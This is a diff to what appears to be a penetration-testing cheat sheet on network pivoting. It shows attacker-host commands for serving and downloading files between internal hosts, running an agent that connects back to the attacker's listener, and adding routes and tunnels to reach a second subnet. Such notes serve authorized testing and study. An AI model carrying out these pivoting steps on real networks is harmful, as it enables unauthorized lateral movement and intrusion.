@@ -126,10 +126,12 @@ attacker_host: python3 -m http.server 80
 172.16.5.35: curl http://172.16.5.15:1235/file -o file
 
 Second Hop:
-attacker_host: listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:11601
-Agent2: agent.exe -connect 172.16.5.15:4444 -ignore-cert
-attacker_host: session;2
-attacker_host: start --tun internal2  (now u can ping 172.16.6.35)
+attacker_host: upload agent onto second duel-homed machine
+Agent2: agent.exe -connect attacker_host:11601 -ignore-cert
+attacker_host: choose session
+attacker_host: autoroute
+attacker_host: use a new network interface to start second tunnel
+attacker_host: add the second subnet into the new network interface (for example: sudo ip route add 172.16.2.0/24 dev new_network_interface)
 ```
 ### Windows Port forwarding
 ###### PLINK.exe
